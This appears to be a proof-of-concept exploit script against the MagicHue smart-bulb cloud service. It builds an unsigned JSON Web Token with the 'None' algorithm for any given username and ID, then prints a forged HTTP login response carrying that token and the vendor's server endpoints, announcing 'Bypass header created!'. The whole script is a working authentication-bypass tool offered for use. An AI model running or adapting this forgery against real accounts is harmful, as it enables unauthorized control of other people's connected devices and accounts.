#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re
import time
from wsgiref.handlers import format_date_time
from datetime import datetime
from time import mktime

now = datetime.now()
stamp = mktime(now.timetuple())

def Usage():
    print (f"Usage: {sys.argv[0]} <username> <unique id>")

def Main(user, uniqid):
    os.system('clear')
    print ("[+] Encoding ...")
    print ("[+] Bypass header created!")
    print ("HTTP/1.1 200")
    print ("Server: nginx/1.10.3")
    print ("Date: "+str(format_date_time(stamp))+"")
    print ("Content-Type: application/json;charset=UTF-8")
    print ("Connection: close\r\n\r\n")

    jwt_header = '{"typ": "JsonWebToken","alg": "None"}'
    jwt_data = '{"userID": "'+user+'", "uniID": "'+uniqid+'","cdpid": "ZG001","clientID": "","serverCode": "US","expireDate": 1744364396000,"refreshDate": 1613080850608,"loginDate": 1602712850608}'
    jwt_headerEncoded = url64.encode(jwt_header.strip())
    jwt_dataEncoded = url64.encode(jwt_data.strip())
    jwtcombined = (jwt_headerEncoded.strip()+"."+jwt_dataEncoded.strip()+".")
    print ("{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http://wifij01us.magichue.net/app/ota/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\""+user+"\",\"userEmail\":\""+user+"\",\"userUniID\":\""+uniqid+"\"},\"token\":\""+jwtcombined+"\"}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        Usage()
    else:
        Main(sys.argv[1], sys.argv[2])
